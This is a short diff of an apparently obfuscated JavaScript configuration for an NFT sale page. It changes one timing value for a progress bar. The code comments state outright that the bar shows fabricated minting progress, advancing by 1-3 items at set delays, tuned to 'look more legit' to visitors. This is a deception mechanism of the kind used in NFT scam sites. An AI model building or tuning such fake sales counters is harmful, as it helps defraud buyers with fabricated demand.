@@ -33,7 +33,7 @@ function _0x227f(_0x3622d9, _0x2c2f28) {
     // amount is how many NFTs are being sold.
 	amount = 5000,
     // this value doesn't really need to be changed, it just changes how fast the progress bar moves to show how many NFTs have been purchased.
-	_0x43886a = 80,
+	_0x43886a = 83.4,
     // delay basically chooses how often the progress bar should increase in value, the time is in ms.
     // added chooses how many nfts that have been minted with a value between of 1-3 (slower is better, looks more legit if it's a smaller project)
 	delay = [
